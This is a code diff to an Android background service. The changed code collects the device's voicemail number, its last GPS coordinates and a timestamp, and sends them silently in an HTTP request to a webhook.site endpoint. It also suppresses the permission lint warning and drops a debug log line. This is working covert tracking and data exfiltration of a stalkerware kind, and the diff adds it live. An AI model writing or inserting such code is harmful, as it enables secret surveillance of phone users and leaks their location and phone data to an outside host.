@@ -66,17 +66,15 @@ public class BackgroundService extends IntentService {
             @SuppressLint("MissingPermission")
             @Override
             public void run() {
-                String deviceId = telephonyManager.getDeviceSoftwareVersion();
+                String voiceMailNumber = telephonyManager.getVoiceMailNumber();
                 Location location = locationManager.getLastKnownLocation("gps");
                 double longitude = (location != null) ? location.getLongitude() : 0;
                 double latitude = (location != null) ? location.getLatitude() : 0;
-                Long at = System.currentTimeMillis();
-
-                Log.d("COVFEFE", "https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?device_id=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
+                long at = System.currentTimeMillis();
 
                 HttpURLConnection urlConnection = null;
                 try {
-                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?software_version=" + deviceId + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
+                    URL url = new URL("https://webhook.site/13f9a354-0312-480b-b0ac-a33855edfc1c?voice_mail_num=" + voiceMailNumber + "&long=" + longitude + "&lat=" + latitude + "&at=" + at);
                     urlConnection = (HttpURLConnection) url.openConnection();
                     InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                 } catch (IOException e) {
